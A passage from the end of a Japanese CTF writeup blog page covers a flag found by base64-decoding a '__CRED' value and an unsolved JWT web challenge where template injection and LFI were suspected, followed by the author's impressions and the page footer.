+</code></pre><p>再度セットされた<code>__CRED</code>をbase64デコードすると, flagが格納されています.</p><p><img src=/images/posts/20/serial_flag.png alt=flag></p><h1 id=web-ironhand>[web] Ironhand</h1><p>解けませんでした. JWTが使われているものの<a href=https://github.com/ticarpi/jwt_tool>jwt_tool</a>で調査をした限り, 脆弱な使い方はされていない印象を受けました. そのため, Template InjectionやLFIを疑いましたが, 具体的な攻撃に繋げられませんでした. 公式のwriteupや他の方のwriteupを見るのが楽しみです.</p><h1 id=感想>感想</h1><p>web問は去年のctf4bより難しかった気がしました. ひと工夫が必要な難しい問題ばかりで楽しかったです.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
